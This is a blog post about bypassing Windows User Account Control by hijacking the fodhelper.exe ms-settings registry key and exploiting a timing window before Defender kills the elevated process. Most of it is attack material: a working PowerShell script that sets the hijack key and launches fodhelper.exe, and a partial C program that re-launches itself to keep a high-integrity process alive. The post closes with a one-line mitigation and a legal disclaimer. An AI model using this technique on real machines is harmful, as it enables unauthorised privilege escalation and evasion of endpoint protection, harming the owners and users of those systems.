---
layout: post
title:  "UAC Bypassing With fodhelper.exe, even after patches."
date:   2024-12-28 12:00:00 -0600
categories: cybersecurity maldev networking
---

# First, what is the OG bypass?

Back in the olden days, people loved to walk right past UAC with Registry Key Manipulation and fodhelper.exe. In short, fodhelper.exe will run processes with the highest elevation that are designated in the reg key `HKCU:\Software\Classes\ms-settings\Shell\Open\command`, in the `(default)` value, if the `DelegateExecute` value is set. This is obviously pretty bad for UAC and since then Microsoft has been hard at work (not really) trying to solve this problem.

After various security updates, times are different now. If you attempt to do the same thing now with a simple PowerShell script, Defender blows up, closes the calling process, and even resets our registry keys to default, quite a shame.

Here is a sample script that does this. (Remember this, it's important later 😉)

{% highlight powershell %}
[String]$maliciousExePath = "C:\whatever"

New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $maliciousExePath -Force

Start-Process "C:\Windows\System32\fodhelper.exe"
{% endhighlight %}

# Initial Observations

Playing around with this technique, even in its broken state, I found some fun stuff. Maybe you as the reader can figure out where I'm going with this:

1. The process modifying registry keys is not *instantly* closed, so the PowerShell script above will still (most of the time) execute the line under it that starts fodhelper.exe.
2. The process started maliciously is closed, but also not *instantly*.
3. The new registry value is not *instantly* reset. This should be kind of obvious, seeing that the malicious process is started at all by the above script. This face proves especially useful later, however.

# Discovery

While working with the bypass technique, the time window stuck out as the easiest thing to take advantage of. I noticed that while the process I opened with the basic technique was almost instantly killed, I noticed that it was still able to perform some high-level functions in the short time window that it had. I naturally had the idea that while the high-level process might be killed almost instantly, what happens to child processes, or process spawned in admin context with `system`?

The answer is: absolutely nothing! They are created as high-integrity, even!

# Technique Simplified (How I am using it)

1. Set the path to the process as the default value in the registry key for fodhelper.exe, add `DelegateExecute`.
2. Attacking process opens fodhelper.exe before registry key is reset.
3. High-integrity process is spawned, and must then act as a *proxy* to another process before it is shortly killed.
4. The new-new process will be high-integrity, and will also not be killed. Magic!

Here is an example process that can elevate itself with a little left out for the reader to enjoy themselves. It uses arguments to open *itself* when called from fodhelper.exe.

{% highlight c %}
int main(int argc, char * argv[]) {
    if(argc == 2) {
        system("Directory to self..."); // Opens self when there is an argument.
    }

    // Open and change reg keys with some method, maybe system(), or RegSetValueExW or many other methods.
    
    // I set the default to "dir..sample.exe arg", to trigger the self replication on admin.

    // Windows is angry, elevate now!
    system("fodhelper.exe")

    // Process is dead here normally, but the new process is high-integrity and stays alive!

    // Administrator functions...
}

{% endhighlight %}

# Protecting yourself from this bypass

It is kind of easy, just set the UAC settings to ALWAYS ASK! For some reason, Windows does not normally do this and it definitely should. This setting will stop this bypass in its tracks!

# Disclaimer

Bypassing UAC on machines that you do not have permission to do so on is illegal. Think about the possible ramifications and effects that you may have if you use this on a vulnerable machine.

As always, I write these for security education and fun, and do not intend for any harm to be dome.